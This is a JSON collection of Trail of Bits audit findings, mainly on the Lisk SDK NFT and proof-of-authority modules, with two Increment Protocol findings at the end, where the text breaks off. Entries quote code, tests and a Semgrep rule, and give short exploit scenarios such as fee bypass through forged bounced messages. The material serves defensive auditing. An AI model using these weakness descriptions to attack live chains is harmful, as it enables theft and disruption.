        "title": "3. NFT lock method does not check if module is NFT_NOT_LOCKED ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf",
        "body": "The NFT lock method does not check that the module attempting to lock the NFT is not equal to the magic value that represents an unlocked NFT, the NFT_NOT_LOCKED constant (which is equal to nft). It is unlikely that another module is or can be named nft; however, this check should be added to prevent misuse of the lock method. Exploit Scenario Another module that extends or makes use of the NFT module calls the lock method with the module argument set to nft by mistake (e.g., a developer misunderstands the purpose of the module argument). The NFT does not get locked as the developer expected. Recommendations Short term, add a check in the code that ensures that the lock functions module argument is not equal to NFT_NOT_LOCKED. Long term, review stores that use a single state variable to represent more than one state through the use of magic values. In the example described above, the lockingModule state variable is used to determine which module locked the NFT and has a special valueNFT_NOT_LOCKEDto indicate that no module locked it. If possible, we recommend storing the state in two variables, isLocked and lockingModule, to reduce the use of magic values that may lead to state confusion. Do the same decomposition for other stores, where applicable. If these changes are not possible or wanted, ensure that the magic values are always checked when the state is modied. 21 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. NFT methods API could be improved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf",
        "body": "The NFT module performs various checks, such as if an NFT is escrowed or if an NFT is locked in a way that makes the code longer and less readable. Some checks (e.g., NFT existence) also happen more than necessary because of the way the API is designed. To check if an NFT is escrowed to another chain, the code does the check shown in gure 4.1 in several locations. if (owner.length === LENGTH_CHAIN_ID) { Figure 4.1: An if statement that checks if an NFT is escrowed (lisk-sdk/framework/src/modules/nft/commands/transfer.ts#60) This check relies on the fact that the owner eld will have a dierent length if it is storing the address of a native user or the chain ID of a foreign chain. To someone not familiar with the inner workings of the NFT module (e.g., a new employee or a curious user), this is not clear. Instead, the code should call a function named isNFTEscrowed to clarify the purpose of the check being performed. To check if an NFT is locked, the code does the check shown in gure 4.1 in several locations. const lockingModule = await this._method.getLockingModule( context.getMethodContext(), params.nftID, ); if (lockingModule !== NFT_NOT_LOCKED) { Figure 4.2: An if statement that checks if an NFT is locked (lisk-sdk/framework/src/modules/nft/commands/transfer.ts#6875) This check relies on the fact that the lockingModule has a magic value, NFT_NOT_LOCKED, that represents an unlocked NFT. Again, to someone not familiar with the inner workings of the NFT module, it may not be clear why the code is checking the 22 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment lockingModule to see if an NFT is locked. Instead, the code could call a function named isNFTLocked. This would also shorten the codes length. Another problem with the current API is that all NFT methods take an NFT ID argument; as a result, many functions end up performing repeated operations when called in succession. One example of this is the verify function of the TransferCommand command (gure 4.3). public async verify(context: CommandVerifyContext<Params>): Promise<VerificationResult> { const { params } = context; const nftStore = this.stores.get(NFTStore); const nftExists = await nftStore.has(context, params.nftID); if (!nftExists) { throw new Error('NFT substore entry does not exist'); } const owner = await this._method.getNFTOwner(context.getMethodContext(), params.nftID); if (owner.length === LENGTH_CHAIN_ID) { throw new Error('NFT is escrowed to another chain'); } if (!owner.equals(context.transaction.senderAddress)) { throw new Error('Transfer not initiated by the NFT owner'); } const lockingModule = await this._method.getLockingModule( context.getMethodContext(), params.nftID, ); if (lockingModule !== NFT_NOT_LOCKED) { throw new Error('Locked NFTs cannot be transferred'); } return { status: VerifyStatus.OK, }; } Figure 4.3: The verify function of the TransferCommand command (shortened for brevity) (lisk-sdk/framework/src/modules/nft/commands/transfer.ts#4580) The code from gure 4.3 calls the nftStore.has function to check if the NFT exists. Then, the getNFTOwner call internally calls nftStore.has again to check if the NFT exists and it calls nftStore.get to obtain the data of the NFT and extract its owner. Finally, getLockingModule will internally call getNFTOwner (which calls nftStore.has and nftStore.get again). In conclusion, in these three operationschecking the existence of the NFT, getting its owner, and getting its locking modethe existence check is performed three separate times, and the NFT data is obtained two times. 23 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment If the API was designed to receive the NFT data object instead of the NFT ID for most operations (all except checking an NFTs existence and getting the NFT), then this duplication of checks would not occur. In gure 4.4, we suggest an alternative implementation that calls the isNFTEscrowed and isNFTLocked for shorter and cleaner code. This implementation passes to these functions the NFT object instead of the NFT ID to avoid the duplication of checks described above. public async verify(context: CommandVerifyContext<Params>): Promise<VerificationResult> { const { params } = context; const ctx = context.getMethodContext(); const nftData = await this._method.getNFT(ctx, params.nftID); if (!nftData) { throw new Error('NFT substore entry does not exist'); } if (this._method.isNFTEscrowed(ctx, nftData)) { throw new Error('NFT is escrowed to another chain'); } if (!nftData.owner.equals(context.transaction.senderAddress)) { throw new Error('Transfer not initiated by the NFT owner'); } if (this._method.isNFTLocked(ctx, nftData)) { throw new Error('Locked NFTs cannot be transferred'); } return { status: VerifyStatus.OK, }; } Figure 4.4: An alternative example implementation of the verify function of the TransferCommand command Recommendations Short term, create methods to check if an NFT is escrowed and if an NFT is locked. This will improve the codes readability and reduce its size. Furthermore, consider updating most methods of the NFT module to receive the NFT object instead of the NFT ID. This will reduce the amount of time the same check is done in each function. Long term, review other modules where these recommendations may also apply. 24 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Checks done manually instead of using schema validation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf",
        "body": "In two locations in the proof of authority module, checks are done manually when schema validation could be used instead. Using schema validation would result in more robust code. In endpoint.ts, the parameter given to getValidator is checked in the following way: const { address } = context.params; if (typeof address !== 'string') { throw new Error('Parameter address must be a string.'); } cryptoAddress.validateLisk32Address(address); Figure 5.1: Check in getValidator (lisk-sdk/framework/src/modules/poa/endpoint.ts#33-37) However, the following check could be performed instead: validator.validate(getValidatorRequestSchema, address) Figure 5.2: Proposed check for getValidator In commands/update_authority.ts, the length of the commands newValidators list is checked in the following way: if (newValidators.length < 1 || newValidators.length > MAX_NUM_VALIDATORS) { throw new Error( `newValidators length must be between 1 and ${MAX_NUM_VALIDATORS} (inclusive).`, ); } Figure 5.3: Length check in updateAuthority (lisk-sdk/framework/src/modules/poa/commands/update_authority.ts#33-37) 25 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment However, if minItems and maxItems elds were added to the schema for this command (updateAuthoritySchema), this check would be done automatically by the schema validator. Recommendations Short term, add the suggested validator.validate check to endpoint.ts and add the minItems and maxItems elds to the updateAuthoritySchema. Long term, ensure that all Lisk schemas are as expressive as possible. 26 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Update authority command allows validators to have 0 weight ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf",
        "body": "When the proof of authority module initializes its genesis state, it checks that all active validators have nonzero (and positive) weights: // Check that the weight property of every entry in the snapshotSubstore.activeValidators array is a positive integer. if (activeValidators[i].weight <= BigInt(0)) { throw new Error('`activeValidators` weight must be positive integer.'); } Figure 6.1: Validator weight check in genesis initialization (lisk-sdk/framework/src/modules/poa/module.ts#247-250) However, the same check is not made by the update authority command. This means that the current validators could vote to approve a new validator list that includes validators with 0 weight. We could not nd any way that this could be exploited to cause a security problem. However, it would be a good practice to ensure that the invariant for each i, activeValidators[i].weight > 0 always holds. Recommendations Short term, add a check which throws an exception if a validator has 0 weight. Long term, ensure that other expected invariants on weights are ensured. 27 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Incorrect MIN_SINT_32 constant ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf",
        "body": "The MIN_SINT_32 constant, used by Lisks schema validator, is incorrect: its value is -2147483647, but should be -2147483648, since this is the minimum possible 32-bit signed integer. Exploit Scenario A legitimate user tries to use the value -2147483648 in a sint32 eld of a message, but is unable to because the schema validator rejects the message. Recommendations Change the value of the MIN_SINT_32 constant to -2147483648. 28 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Event errors are reverted ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf",
        "body": "The DestroyEvent and the LockEvent classes error methods do not call the BaseEvent classs add method with the noRevert argument set to true. The noRevert argument is used to prevent reverting specic events even when command execution fails; it is useful to emit error events that describe the error that caused the execution failure. Since the DestroyEvent and the LockEvent classes error methods do not pass this argument to the add function, as shown in gures 8.1 and 8.2, and its default value is false, the error eventsemitted when a transaction is about to failwill never be seen by the user. public error(ctx: EventQueuer, data: DestroyEventData, result: NftErrorEventResult): void { this.add(ctx, { ...data, result }, [data.address, data.nftID]); } Figure 8.1: The error method of the DestroyEvent class (lisk-sdk/framework/src/modules/nft/events/destroy.ts#5658) public error(ctx: EventQueuer, data: LockEventData, result: NftErrorEventResult) { this.add(ctx, { ...data, result }, [Buffer.from(data.module), data.nftID]); } Figure 8.2: The error method of the LockEvent class (lisk-sdk/framework/src/modules/nft/events/lock.ts#6365) We found this issue with the Semgrep rule error_event_is_not_revert, which we provided in the rst phase of this audit. rules: - id: error_event_is_not_revert message: An event class has an error function that adds an event that is not persisted. languages: [typescript] severity: WARNING patterns: - pattern-inside: > 29 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment class $CLASS extends BaseEvent { ... } - pattern: > error(...) { ... } - pattern-not: > error(...) { ... this.add(..., true); ... } Figure 8.3: The error_event_is_not_revert Semgrep rule Exploit Scenario 1 An attacker has an attack against a custom side chain that involves brute forcing the destroy method of the NFT module. No error event is emitted for these failures. The attack goes unnoticed. Exploit Scenario 2 A user or blockchain developer tries to destroy an NFT. Their call to the destroy method fails but no error event is emitted. The user fails or takes a very long time to debug the root cause of the failure. Recommendations Short term, on every error method of a subclass of the BaseEvent class (specically for DestroyEvent and LockEvent), pass the noRevert argument set to true. This will ensure that error events are not reverted when commands fail. Long term, to avoid similar errors in the future, integrate the error_event_is_not_revert Semgrep rule, as well as every Semgrep rule that we provided in the rst phase of the audit, into the CI/CD pipeline. Additionally, consider adding an error method to the BaseEvent class that is similar to the add method, but with the noRevert argument defaulting to true. This will make it easier for developers to write code without this buggy pattern. 30 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "9. Unspecied and poorly named NFT endpoints ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf",
        "body": "The getCollectionIDs, collectionExists, and isNFTSupported endpoints of the NFT module exist in the code but are not dened in LIP-0052. Furthermore, the getCollectionIDs and collectionExists functions incorrectly perform a check if an NFT is supported. Instead of using the isNFTSupported method of the NFT module, these functions use the code shown in gure 9.1. const supportedNFTsStore = this.stores.get(SupportedNFTsStore); const chainExists = await supportedNFTsStore.has(ctx, chainID); Figure 9.1: lisk-sdk/framework/src/modules/nft/endpoint.ts#180182 This check does not take into account the existence of the ALL_SUPPORTED_NFTS_KEY key in the SupportedNFTsStore. Also, getCollectionIDs returns the same value if there are no supported collections or if all collections are supported for a given chain. Finally, the functions names are not clear. Given these unclear names and nonexistent specication, we are not entirely sure of the functions intended functionality, but alternative names could be getSupportedCollectionIDs and isCollectionIDSupported. Recommendations Short term, specify the functions described above in the LIP, rename them with a clearer name, and x their functionality accordingly with the developed specication. Long term, create a process to limit adding code to modules without it being specied in a LIP. 31 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. The removeSupportAllNFTs function may not remove support for all NFTs ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf",
        "body": "The removeSupportAllNFTs method of the NFT module may not remove support of all NFTs if the ALL_SUPPORTED_NFTS_KEY is present. The removeSupportAllNFTs method (gure 10.1) removes all keys in the SupportedNFTsStore that are returned by the supportedNFTsStore.getAll method (gure 10.2). However, the getAll function will never return the ALL_SUPPORTED_NFTS_KEY key because it iterates over all keys of size LENGTH_CHAIN_ID but ALL_SUPPORTED_NFTS_KEY is the empty string (i.e., does not have a length of LENGTH_CHAIN_ID). public async removeSupportAllNFTs(methodContext: MethodContext): Promise<void> { const supportedNFTsStore = this.stores.get(SupportedNFTsStore); const allSupportedNFTs = await supportedNFTsStore.getAll(methodContext); for (const { key } of allSupportedNFTs) { await supportedNFTsStore.del(methodContext, key); } this.events.get(AllNFTsSupportRemovedEvent).log(methodContext); } Figure 10.1: lisk-sdk/framework/src/modules/nft/method.ts#709719 public async getAll( context: ImmutableStoreGetter, ): Promise<{ key: Buffer; value: SupportedNFTsStoreData }[]> { return this.iterate(context, { gte: Buffer.alloc(LENGTH_CHAIN_ID, 0), lte: Buffer.alloc(LENGTH_CHAIN_ID, 255), }); } Figure 10.2: lisk-sdk/framework/src/modules/nft/stores/supported_nfts.ts#6370 We used the test from gure 10.3 to conrm the issue described above. it('should remove all existing entries even if the ALL_SUPPORTED_NFTS_KEY 32 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment entry exists', async () => { await supportedNFTsStore.save(methodContext, ALL_SUPPORTED_NFTS_KEY, { supportedCollectionIDArray: [], }); await expect(method.removeSupportAllNFTs(methodContext)).resolves.toBeUndefined(); await expect(supportedNFTsStore.has(methodContext, ALL_SUPPORTED_NFTS_KEY)).resolves.toBeFalse(); checkEventResult(methodContext.eventQueue, 1, AllNFTsSupportRemovedEvent, 0, {}, null); }); Figure 10.3: Test that fails because the removeSupportAllNFTs does not delete the ALL_SUPPORTED_NFTS_KEY key. Highlighted in red is the check that fails. Exploit Scenario A module relies on the removeSupportAllNFTs function for removing support for all NFTs under specic conditions. The call to removeSupportAllNFTs fails to remove support for all NFTs. An attacker exploits this fact to break the modules assumptions and exploit the sidechain. Recommendations Short term, in the removeSupportAllNFTs function, also remove the ALL_SUPPORTED_NFTS_KEY key. Add the test in gure 10.3 to the existing test suite. Long term, write more complex tests for removeSupportAllNFTs and similar functions. Edge cases and magic values such as ALL_SUPPORTED_NFTS_KEY should be thoroughly tested. 33 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "11. Bug in removeSupportAllNFTs tests ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf",
        "body": "The test for the removeSupportAllNFTs function incorrectly saves a random wrong value to the supportedNFTsStore store. The test should work by: 1) creating a random chainID, 2) saving that chainID to the supportedNFTsStore store, 3) removing the support for that chainID, and 4) checking that the supportedNFTsStore no longer contains the chainID key. The bug is in step 2, where the code is just saving a random chain ID instead of using the chainID variable (highlighted in red in gure 11.1). const chainID = utils.getRandomBytes(LENGTH_CHAIN_ID); await supportedNFTsStore.save(methodContext, utils.getRandomBytes(LENGTH_CHAIN_ID), { supportedCollectionIDArray: [], }); await expect(method.removeSupportAllNFTs(methodContext)).resolves.toBeUndefined(); await expect(supportedNFTsStore.has(methodContext, chainID)).resolves.toBeFalse(); Figure 11.1: lisk-sdk/framework/test/unit/modules/nft/method.spec.ts#11831191 Furthermore, by removing the call to supportedNFTsStore.save altogether, the test still passes, which is undesirable. The code should rst check that the NFT is supported, remove support for all NFTs, and check if the NFT is no longer supported. Recommendations Short term, x the test described above by replacing the call to supportedNFTsStore.saves utils.getRandomBytes(LENGTH_CHAIN_ID) argument with the chainID variable. Also, add a check in the test that ensures that the NFT is supported before removing it. Long term, use a tool such as necessist to nd other issues in tests. 34 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Bounced NFT transfers may cause events to contain incorrect data ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf",
        "body": "When an error occurs on a cross-chain NFT transfer and the status of the CCM is not CCM_STATUS_CODE_OK, the recipientAddress variable is set to the value of the senderAddress variable in two locations: here and here. The senderAddress variable is not updated. Then, at the end of the function, a CcmTransferEvent event is emitted with the senderAddress and recipientAddress values (gure 12.1), which, as explained above, will always have the same value on status dierent from CCM_STATUS_CODE_OK. The same problem exists in the token module. this.events.get(CcmTransferEvent).log(context, { senderAddress, recipientAddress, nftID, }); Figure 12.1: lisk-sdk/framework/src/modules/nft/cc_commands/cc_transfer.ts#157161 Another problem is the lack of sending and receiving chainID data in the event. While the token module includes the receiving chainID, the NFT module includes neither (as shown in gure 12.1). Exploit Scenario A developer is tracing where an NFT was transferred to and from to audit an ongoing attack. In the logs, the developer sees that the NFT was transferred from account A to account B and then, because an error occurred, the log will show a transfer from account A to account A. In both cases, the receiving and sending chainIDs are not included in the event data. This confuses the developer and slows down the auditing process. Recommendations Short term, in both the NFT and token modules CcmTransferEvent event, update the senderAddress to correctly show the sender address of the NFT or token amount. Consider if the event data should also include the sending and receiving chainIDs, and 35 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment update both modules accordingly. This will make the CcmTransferEvent events emitted by the NFT and Token modules more expressive and consistent with each other. Long term, review the events emitted in all other commands. Ensure that they are consistent with similar commands and that they are sucient to trace the ownership of assets and other required properties. 36 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "13. An NFT's attributesArray can have duplicate modules ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf",
        "body": "The NFT module denes the createNFTEntry function, which is responsible for creating a new NFT and ensuring that the NFTs attributesArray array does not have duplicate modules, as highlighted in gure 13.1. public async createNFTEntry( methodContext: MethodContext, address: Buffer, nftID: Buffer, attributesArray: NFTAttributes[], ): Promise<void> { const moduleNames = []; for (const item of attributesArray) { moduleNames.push(item.module); } if (new Set(moduleNames).size !== attributesArray.length) { throw new Error('Invalid attributes array provided'); } const nftStore = this.stores.get(NFTStore); await nftStore.save(methodContext, nftID, { owner: address, attributesArray, }); } Figure 13.1: lisk-sdk/framework/src/modules/nft/internal_method.ts#6383 The createNFTEntry function is never called; instead, the nftStore.save method is called directly in many locations. In some locations, such as in the create method, the attributeArray uniqueness check is copy-pasted, while in others this uniqueness property is not enforced. In particular, two places may result in the NFT having duplicate module attributes:  When a foreign NFT is received (lisk-sdk/framework/src/modules/nft/cc_commands/cc_transfer.ts#L142-L145) 37 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment  When a foreign NFT is bounced (lisk-sdk/framework/src/modules/nft/cc_commands/cc_transfer.ts#L149-L152) In the recover function and cross-chain transfers to the NFTs native chain, this problem also exists but is not exploitable because the incoming NFT attributes are dropped by the current implementation of getNewAttributes:  lisk-sdk/framework/src/modules/nft/cc_commands/cc_transfer.ts#L116  lisk-sdk/framework/src/modules/nft/method.ts#L977 The createUserEntry function is also not used here and here, and the createEscrowEntry function is not used here. Exploit Scenario An attacker sends an NFT with duplicate attributes from chain A (the NFTs native chain) to chain B. A custom module of chain B performs validation of the NFTs attributes by iterating over the attributes array until it nds the rst instance corresponding to module X (e.g., using the arrays find method) and then doing the check. Later, the same custom module gets the attributes for module X in a dierent way that returns the last instance on the attributes array instead of the rst (e.g., by iterating over the whole array and adding the values to a map for faster access). Only the rst instance is checked, breaking the guarantees that the module has for the attributes and potentially leading to a security problem. Recommendations Short term, in every location where an NFT is created or updated, use a purposely built function (e.g., the createNFTEntry function) to create the NFT and ensure the correctness of its properties. Avoid calling nftStore.save and similar methods in other code locations. Long term, in general, avoid modifying the stores state directly, especially when specic properties need to be enforced. Instead, create purposely built functions that enforce the properties in a single centralized location that is easy to audit and avoids code repetition. See gure 4.4 from nding TOB-LISK2-4 to see what the nal result could look like. 38 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "14. Bounced messages may be abused to bypass NFT fees ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf",
        "body": "On CCMs with a status dierent from CCM_STATUS_CODE_OK (gure 14.1 highlighted in yellow), the NFT creation does not incur a fee. if (status === CCM_STATUS_CODE_OK) { this._feeMethod.payFee(getMethodContext(), BigInt(FEE_CREATE_NFT)); await nftStore.save(getMethodContext(), nftID, { owner: recipientAddress, attributesArray: receivedAttributes as NFTAttributes[], }); await this._internalMethod.createUserEntry(ctx, recipientAddress, nftID); } else { recipientAddress = senderAddress; await nftStore.save(getMethodContext(), nftID, { owner: recipientAddress, attributesArray: receivedAttributes as NFTAttributes[], }); await this._internalMethod.createUserEntry(ctx, recipientAddress, nftID); } Figure 14.1: lisk-sdk/framework/src/modules/nft/cc_commands/cc_transfer.ts#140154 This code works this way because messages with a status dierent from CCM_STATUS_CODE_OK are expected to be a bounced CCM, i.e., a CCM where the NFT is being recreated after a previous cross-chain transfer failed. However, there is nothing preventing a malicious sidechain from initiating a CCM with any status, enabling them to transfer NFTs cross-chain without paying the fee. Exploit Scenario Chain A sends an NFT (native to Chain A) to chain B, setting the message status to a value dierent from CCM_STATUS_CODE_OK (e.g., CCMStatusCode.MODULE_NOT_SUPPORTED). Chain B receives the foreign NFT and creates the NFT entry without the fee payment. 39 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment Recommendations Short term, enforce a fee payment even on bounced messages. If this is not possible or wanted, modify the interoperability module to guarantee that the mainchain enforces that bounced messages cannot be initiated by malicious side chains. Long term, review other modules handling of bounced messages to ensure similar problems do not exist. 40 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "15. NFT recover function may crash ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf",
        "body": "The recover function of the NFT module does not verify that the NFT to be recovered exists in its NFTStore. This causes the nftStore.get call highlighted in gure 15.1 to crash. const nftData = await nftStore.get(methodContext, nftID); if (!nftData.owner.equals(terminatedChainID)) { Figure 15.1: lisk-sdk/framework/src/modules/nft/method.ts#940941 Exploit Scenario A malicious sidechain sends a fake recovered NFT that does not exist on its native chain. The native chains recover function crashes. Recommendations Short term, add a check to ensure that the NFT exists before accessing its data. This will ensure the recover function throws an exception explicitly instead of crashing unexpectedly. Long term, write fuzzing harnesses that send arbitrary objects (that are valid according to given schema) to the recover method to simulate the behavior of malicious sidechains. 41 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "16. NFT recover function does properly validate NFT attributes array ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf",
        "body": "The recover function of the NFT module does not call validator.validate on the storeValue variable after decoding the value (gure 16.1). try { decodedValue = codec.decode<NFTStoreData>(nftStoreSchema, storeValue); } catch (error) { isDecodable = false; } Figure 16.1: lisk-sdk/framework/src/modules/nft/method.ts#902908 As such, the NFT attributes module names are not validated for length or pattern with the nftStoreSchema, which is shown in gure 16.2. export const nftStoreSchema = { $id: '/nft/store/nft', type: 'object', required: ['owner', 'attributesArray'], properties: { owner: { dataType: 'bytes', fieldNumber: 1, }, attributesArray: { type: 'array', fieldNumber: 2, items: { type: 'object', required: ['module', 'attributes'], properties: { module: { dataType: 'string', minLength: MIN_LENGTH_MODULE_NAME, maxLength: MAX_LENGTH_MODULE_NAME, pattern: '^[a-zA-Z0-9]*$', fieldNumber: 1, }, 42 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment attributes: { dataType: 'bytes', fieldNumber: 2, }, }, }, }, }, }; Figure 16.2: lisk-sdk/framework/src/modules/nft/stores/nft.ts#2859 The following test can be used to conrm that the call to codec.decode does not validate a strings length. describe('length_validation', () => { const schema_with_max_length = { $id: '/lisk/decode/with_max_length', type: 'object', properties: { foo: { dataType: 'string', fieldNumber: 1, minLength: 2, maxLength: 2, }, }, }; it('should work with a valid length of 2', () => { const res = codec.encode(schema_with_max_length, {foo: \"12\"}); expect(codec.decode(schema_with_max_length, res)).toEqual({foo: \"12\"}); }); it('should not work with length different than 2', () => { const res = codec.encode(schema_with_max_length, {foo: \"12345\"}); expect(codec.decode(schema_with_max_length, res)).toThrow(); // This does not throw }); }); Figure 16.3: Test that conrms that calls to codec.decode do not validate a strings length This nding is informational because the attributes are not used unless a custom module implements the getNewAttributes function. Exploit Scenario An attacker recovers an NFT from a chain they own to a sidechain that reimplements the getNewAttributes function to use the received NFT attributes. The NFTStore store saves data that is inconsistent with the schema. 43 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment Recommendations Short term, have the code call the validator.validate function on the decoded NFTStoreData data. Long term, review every other modules recover methods for the same issue. 44 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "17. The codec.encode function encodes larger than expected integers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf",
        "body": "The encode function of the Codec class successfully encodes integers larger than expected. This issue can be replicated with the test shown in gure 17.1, in which a value of 2100 is successfully encoded as a uint64 (while the maximum value should be 264-1). describe('uint_validation', () => { const schema_uint64 = { $id: 'test/uint_validation', type: 'object', required: ['amount'], properties: { amount: { dataType: 'uint64', fieldNumber: 1, }, }, }; it('uint64 encoding with larger than expected values', () => { expect(codec.encode(schema_uint64, {amount: BigInt(2)**BigInt(100)})).toThrow(); // This does not throw }); }); Figure 17.1: Test that shows the encode function of the Codec class successfully encoding integers larger than expected Calling the decode method of the Codec class on this encoded data fails, breaking the round-trip property of the encode and decode functions. Exploit Scenario A user successfully stores a value in a modules store that is larger than the maximum integer. The user attempts to use the module again but is unable to because the call to decode fails. 45 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment Recommendations Short term, add checks in the code to prevent integers larger than the maximum value or smaller than the minimum value cannot be encoded or decoded. Long term, extend the test suite for integer encoding and decoding to detect these and similar issues. Always tests the corner cases, such as the maximum and minimum integer boundaries. 46 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Governance role is a single point of failure ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf",
        "body": "Because the governance role is centralized and responsible for critical functionalities, it constitutes a single point of failure within the Increment Protocol. The role can perform the following privileged operations:        Whitelisting a perpetual market Setting economic parameters Updating price oracle addresses and setting xed prices for assets Managing protocol insurance funds Updating the addresses of core contracts Adding support for new reserve tokens to the UA contract Pausing and unpausing protocol operations These privileges give governance complete control over the protocol and therefore access to user and protocol funds. This increases the likelihood that the governance account will be targeted by an attacker and incentivizes governance to act maliciously. Note, though, that the governance role is currently controlled by a multisignature wallet (a multisig) and that control may be transferred to a decentralized autonomous organization (DAO) in the future. Exploit Scenario Eve, an attacker, creates a fake token, compromises the governance account, and adds the fake token as a reserve token for UA. She mints UA by making a deposit of the fake token and then burns the newly acquired UA tokens, which enables her to withdraw all USDC from the reserves. Recommendations Short term, minimize the privileges of the governance role and update the documentation to include the implications of those privileges . Additionally, implement reasonable time delays for privileged operations. Long term, document an incident response plan and ensure that the private keys for the multisig are managed safely. Additionally, carefully evaluate the risks of moving from a multisig to a DAO and consider whether the move is necessary.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Inconsistent lower bounds on collateral weights ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf",
        "body": "The lower bound on a collateral assets initial weight (when the collateral is rst whitelisted) is dierent from that enforced if the weight is updated; this discrepancy increases the likelihood of collateral seizures by liquidators. A collateral assets weight represents the level of risk associated with accepting that asset as collateral. This risk calculation comes into play when the protocol is assessing whether a liquidator can seize a users non-UA collateral. To determine the value of each collateral asset, the protocol multiplies the users balance of that asset by the collateral weight (a percentage). A riskier asset will have a lower weight and thus a lower value. If the total value of a users non-UA collateral is less than the users UA debt, a liquidator can seize the collateral. When whitelisting a collateral asset, the Perpetual.addWhiteListedCollateral function requires the collateral weight to be between 10% and 100% (gure 2.1). According to the documentation, these are the correct bounds for a collateral assets weight. function addWhiteListedCollateral ( IERC20Metadata asset, uint256 weight , uint256 maxAmount ) public override onlyRole(GOVERNANCE) { if (weight < 1e17) revert Vault_InsufficientCollateralWeight(); if (weight > 1e18) revert Vault_ExcessiveCollateralWeight(); [...] } Figure 2.1: A snippet of the addWhiteListedCollateral function in Vault.sol#L224-230 However, governance can choose to update that weight via a call to Perpetual.changeCollateralWeight , which allows the weight to be between 1% and 100% (gure 2.2). function changeCollateralWeight (IERC20Metadata asset, uint256 newWeight ) external override onlyRole(GOVERNANCE) { uint256 tokenIdx = tokenToCollateralIdx[asset]; if (!((tokenIdx != 0 ) || ( address (asset) == address (UA)))) revert Vault_UnsupportedCollateral(); if (newWeight < 1e16) revert Vault_InsufficientCollateralWeight(); if (newWeight > 1e18) revert 